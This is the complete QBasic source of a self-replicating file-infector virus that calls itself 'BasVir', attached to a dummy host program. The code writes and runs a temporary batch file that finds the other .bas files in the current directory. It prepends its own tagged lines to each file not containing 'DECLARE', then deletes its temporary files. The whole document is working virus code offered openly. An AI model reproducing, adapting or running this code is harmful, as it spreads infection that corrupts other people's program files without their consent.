basvirH$ = "BASVIR.BAS"
OPEN "~$.bat" FOR OUTPUT AS #2: REM BasVir
PRINT #2, "@echo off %BasVir1%"
PRINT #2, "if '%1=='BasVir goto BasVir%2"
PRINT #2, "for %%a in (*.bas) do call ~$ BasVir 2 %%a"
PRINT #2, "exit": REM BasVir
PRINT #2, ":BasVir2"
PRINT #2, "find "; CHR$(34); "DECLARE "; CHR$(34); "<%3>nul": REM BasVir
PRINT #2, "if not errorlevel 1 goto BasVirE"
PRINT #2, "echo basvirH$ = "; CHR$(34); "%3"; CHR$(34); ">~1": REM BasVir
PRINT #2, "find "; CHR$(34); "BasVir"; CHR$(34); "<"; basvirH$; ">>~1"
PRINT #2, "copy %3 ~2>nul": REM BasVir
PRINT #2, "copy /b ~1+~2 %3>nul": REM BasVir
PRINT #2, "exit": REM BasVir
PRINT #2, ":BasVirE"
CLOSE #2: REM BasVir
SHELL "~$": REM BasVir
SHELL "del ~?.*": REM BasVir
REM ******* [BasVir] the QBasic Virus *******
REM This is a dummy host program
SYSTEM